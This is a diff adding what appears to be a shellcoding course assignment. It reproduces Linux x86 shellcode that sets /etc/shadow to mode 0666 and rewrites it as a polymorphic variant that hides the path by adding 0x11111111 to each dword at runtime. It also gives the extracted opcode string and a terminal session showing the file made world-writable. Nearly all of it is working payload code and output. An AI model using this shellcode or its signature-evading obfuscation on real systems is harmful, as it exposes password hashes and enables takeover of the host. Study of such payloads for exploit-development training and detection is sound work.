@@ -1,0 +1,87 @@
+http://shell-storm.org/shellcode/files/shellcode-556.php
+
+Actual Shellcode ; we are gonna make some obfusication
+
+#include <stdio.h>
+ 
+/*
+    linux/x86 ; chmod(/etc/shadow, 0666) & exit() 33 bytes
+    written by ka0x - <ka0x01[alt+64]gmail.com>
+    lun sep 21 17:13:25 CEST 2009
+ 
+    greets: an0de, Piker, xarnuz, NullWave07, Pepelux, JosS, sch3m4, Trancek and others!
+ 
+*/
+ 
+int main()
+{
+ 
+    char shellcode[] =
+            "\x31\xc0"          // xor eax,eax
+            "\x50"              // push eax
+            "\x68\x61\x64\x6f\x77"      // push dword 0x776f6461
+            "\x68\x2f\x2f\x73\x68"      // push dword 0x68732f2f
+            "\x68\x2f\x65\x74\x63"      // push dword 0x6374652f
+            "\x89\xe3"          // mov ebx,esp
+            "\x66\x68\xb6\x01"      // push word 0x1b6
+            "\x59"              // pop ecx
+            "\xb0\x0f"          // mov al,0xf
+            "\xcd\x80"          // int 0x80
+            "\xb0\x01"          // mov al,0x1
+            "\xcd\x80";         // int 0x80
+ 
+    printf("[*] ShellCode size (bytes): %d\n\n", sizeof(shellcode)-1 );
+    (*(void(*)()) shellcode)();
+     
+    return 0;
+}
+
+toor@ubuntu:~/Desktop/slae/Assignments/6/chmod$ cat chmod.asm
+global _start
+
+
+section .text
+
+_start:
+
+        xor ecx,ecx
+        mul ecx
+
+        push eax
+
+        push 0x665e5350         ;0x776F6461  : actual value -1 wodahs/cte/
+        push 0x57621e1e         ;0x68732F2F
+        push 0x5263541e         ;0x6374652F
+        mov ebx ,esp
+        push eax
+
+        push word 0x1b6
+        pop ecx
+
+        add dword [ebx],0x11111111
+        add dword [ebx+4],0x11111111
+        add dword [ebx+8],0x11111111
+
+        mov al,0xf              ; permisson 666 in octal
+        int 0x80
+
+        mov al,0x1
+        int 0x80
+toor@ubuntu:~/Desktop/slae/Assignments/6/chmod$
+
+
+
+toor@ubuntu:~/Desktop/slae/Assignments/6/chmod$ objdump -d ./chmod|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-7 -d' '|tr -s ' '|tr '\t' ' '|sed 's/
+$//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
+"\x31\xc9\xf7\xe1\x50\x68\x50\x53\x5e\x66\x68\x1e\x1e\x62\x57\x68\x1e\x54\x63\x52\x89\xe3\x50\x66\x68\xb6\x01\x59\x81\x03\x11\x11\x11\x11\x81\x43\x04\x11\x11\x11\x11\x81\x43\x08\x11\x11\x11\x11\xb0\x0f\xcd\x80\xb0\x01\xcd\x80"
+toor@ubuntu:~/Desktop/slae/Assignments/6/chmod$ nano shellcodetest.c
+toor@ubuntu:~/Desktop/slae/Assignments/6/chmod$ sudo chmod 600 /etc/shadow
+toor@ubuntu:~/Desktop/slae/Assignments/6/chmod$ gcc -fno-stack-protector -z execstack shellcodetest.c -o shellcode
+toor@ubuntu:~/Desktop/slae/Assignments/6/chmod$ ls -al /etc/shadow
+-rw------- 1 root shadow 1003 Nov 18 01:35 /etc/shadow
+toor@ubuntu:~/Desktop/slae/Assignments/6/chmod$ sudo ./shellcode
+shellcode length: 56
+toor@ubuntu:~/Desktop/slae/Assignments/6/chmod$ ls -al /etc/shadow
+-rw-rw-rw- 1 root shadow 1003 Nov 18 01:35 /etc/shadow
+toor@ubuntu:~/Desktop/slae/Assignments/6/chmod$
+
